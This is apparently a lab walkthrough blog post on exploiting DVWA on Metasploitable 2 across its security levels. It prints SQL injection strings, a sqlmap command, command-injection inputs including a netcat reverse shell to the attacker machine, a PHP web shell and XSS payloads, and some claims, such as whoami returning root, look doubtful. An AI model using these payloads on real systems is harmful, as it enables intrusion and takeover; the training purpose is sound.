
# **Exploring DVWA on Metasploitable 2: A Step-by-Step Guide to Exploiting Vulnerabilities**

As a cybersecurity enthusiast, getting hands-on experience is crucial to mastering the art of ethical hacking. One of the best ways to practice is by exploiting deliberately vulnerable applications like the Damn Vulnerable Web Application (DVWA) hosted on Metasploitable 2. This blog will guide you through exploiting common vulnerabilities in DVWA at different security levels: Low, Medium, and High. By the end of this guide, you’ll have a solid understanding of how security measures impact exploitation.

## **Environment Setup**
Before we dive in, let’s set up the environment:

- **Attacker Machine:** Kali Linux (IP: `192.168.0.102`)
- **Target Machine:** Metasploitable 2 (IP: `192.168.0.103`)
- **Virtualization Software:** VirtualBox

Ensure that both your Kali and Metasploitable 2 VMs are up and running, and that they are on the same network. You can check their IP addresses using the following command on each machine:

```bash
ifconfig
```

Now, let's dive into the vulnerabilities.

---

## **Understanding DVWA Security Levels**

DVWA allows you to adjust the security level of the web application to simulate different environments. Here’s a quick overview:

- **Low:** Minimal security, designed to be easily exploitable.
- **Medium:** Basic security measures are applied, making it slightly harder to exploit vulnerabilities.
- **High:** Robust security practices are implemented, requiring more advanced techniques or making exploitation impossible.

In each section below, we’ll explore how these security levels affect your ability to exploit various vulnerabilities.

---

## **1. SQL Injection Exploitation**

SQL Injection is a vulnerability that allows attackers to interfere with the queries an application makes to its database. Let’s see how this works in DVWA.

### **Low Security**

At the Low security level, DVWA is highly vulnerable to SQL Injection.

1. **Access DVWA:**
   - Navigate to `http://192.168.0.103/dvwa` in your browser.
   - Log in with the default credentials:
     - Username: `admin`
     - Password: `password`

2. **Set Security Level:**
   - Click on the "DVWA Security" tab and set the security level to "Low."

3. **SQL Injection Test:**
   - Go to the "SQL Injection" section.
   - In the "User ID" field, input the following:
   
   ```bash
   1' OR '1'='1
   ```
   - Click "Submit." You’ll notice that all users from the database are displayed. This indicates that no input validation is in place, making the application vulnerable.

4. **Extract Database Information:**
   - Try extracting the database version with:
   
   ```bash
   1' UNION SELECT NULL, version() #
   ```
   - The database version should now be visible.

### **Medium Security**

At Medium security, DVWA applies some input validation, making SQL Injection harder but not impossible.

1. **Set Security Level:**
   - Go to "DVWA Security" and set the security level to "Medium."

2. **Advanced SQL Injection:**
   - Now, attempt the same input:
   
   ```bash
   1' OR '1'='1
   ```
   - You may notice that this input no longer works. The application might be filtering out certain characters.

3. **Bypass Filters:**
   - Use a more sophisticated payload, like blind SQL injection techniques. If manual attempts fail, consider automating the process with a tool like SQLMap:

   ```bash
   sqlmap -u "http://192.168.0.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=your_session_id" --dbs
   ```

### **High Security**

At High security, DVWA should block SQL Injection attempts through robust input validation and sanitization.

1. **Set Security Level:**
   - Change the security level to "High."

2. **Test SQL Injection:**
   - Try the same input or any advanced payloads. The application should effectively prevent all SQL Injection attempts.

If you still want to challenge yourself, look for alternative vectors or focus on another vulnerability.

---

## **2. Command Injection Exploitation**

Command Injection allows an attacker to execute arbitrary commands on the host OS through a vulnerable web application. Here’s how you can test it in DVWA.

### **Low Security**

At Low security, DVWA does not validate user input, making it vulnerable to Command Injection.

1. **Set Security Level:**
   - Ensure the security level is set to "Low."

2. **Test Command Injection:**
   - Navigate to the "Command Injection" section.
   - In the "IP Address" field, enter:

   ```bash
   192.168.0.102 && whoami
   ```
   - Click "Submit." The server should execute the command and return `root`, indicating that command injection is successful.

3. **Gain a Reverse Shell:**
   - Open a terminal on your Kali machine and start a Netcat listener:

   ```bash
   nc -lvnp 4444
   ```

   - Then, inject the following command into the DVWA input field:

   ```bash
   192.168.0.102 && nc 192.168.0.102 4444 -e /bin/bash
   ```

   - You should now have a root shell on the target machine.

### **Medium Security**

With Medium security, DVWA attempts to sanitize input but may still be vulnerable with some effort.

1. **Set Security Level:**
   - Change the security level to "Medium."

2. **Test Command Injection:**
   - Enter the same command:

   ```bash
   192.168.0.102 && whoami
   ```

   - If this fails, try encoding the characters or using a different injection method, like:

   ```bash
   192.168.0.102 | whoami
   ```

### **High Security**

At High security, DVWA should effectively block Command Injection attempts.

1. **Set Security Level:**
   - Set the security level to "High."

2. **Test Command Injection:**
   - Try injecting commands as before. The application should prevent any form of command execution.

---

## **3. File Upload Exploitation**

Insecure File Upload allows attackers to upload malicious files that can be executed on the server.

### **Low Security**

At Low security, DVWA does not restrict the types of files you can upload.

1. **Set Security Level:**
   - Set the security level to "Low."

2. **Create a Malicious PHP File:**
   - On your Kali machine, create a PHP web shell:

   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   ```

3. **Upload the File:**
   - Go to the "File Upload" section, choose your `shell.php` file, and click "Upload."

4. **Execute the Shell:**
   - Navigate to `http://192.168.0.103/dvwa/hackable/uploads/shell.php?cmd=whoami`. The command should execute, confirming the vulnerability.

### **Medium Security**

At Medium security, DVWA may check the file extension, but simple tricks can bypass it.

1. **Set Security Level:**
   - Change the security level to "Medium."

2. **Bypass File Extension Checks:**
   - Rename your file to `shell.php.jpg` and try uploading it. If it’s accepted, access it as before.

3. **Execute the Shell:**
   - Despite the extension, the server might still execute the PHP code.

### **High Security**

At High security, DVWA enforces stricter file type validation.

1. **Set Security Level:**
   - Set the security level to "High."

2. **Upload Attempt:**
   - Try uploading your `shell.php` file. The application should block it based on the extension or content, preventing code execution.

---

## **4. Cross-Site Scripting (XSS) Exploitation**

XSS allows attackers to inject malicious scripts into webpages viewed by other users.

### **Low Security**

At Low security, DVWA does not sanitize user input, making it easy to execute XSS attacks.

1. **Set Security Level:**
   - Ensure the security level is set to "Low."

2. **Inject Script:**
   - Navigate to "XSS (Stored)" and input the following in the message field:

   ```html
   <script>alert('XSS Attack');</script>
   ```

   - Click "Sign Guestbook." The script will execute, displaying an alert.

### **Medium Security**

At Medium security, DVWA applies some sanitization, but it may not be sufficient.

1. **Set Security Level:**
   - Set the security level to "Medium."

2. **Test Injection:**
   - Try the same script. If blocked, experiment with alternative payloads, such as:

   ```html
   <img src="x" onerror="alert('XSS');">
   ```

### **High Security**

At High security, DVWA should block all XSS attempts through proper input validation and encoding.

1. **Set Security Level:**
   - Change the security level to "

High."

2. **Test Injection:**
   - Injecting scripts should not work at this level. The application should encode or filter out any harmful input.

---

## **Conclusion**

This guide provides a comprehensive look at how DVWA's different security levels impact vulnerability exploitation. By testing these vulnerabilities at Low, Medium, and High security settings, you gain a deeper understanding of how security measures protect against attacks. Remember, these exercises are meant for educational purposes in a controlled environment. Always ensure you have permission to test and exploit any system.

### **References**
- Nmap Documentation
- Metasploit Framework Guide
- OWASP Testing Guide
- Burp Suite User Guide

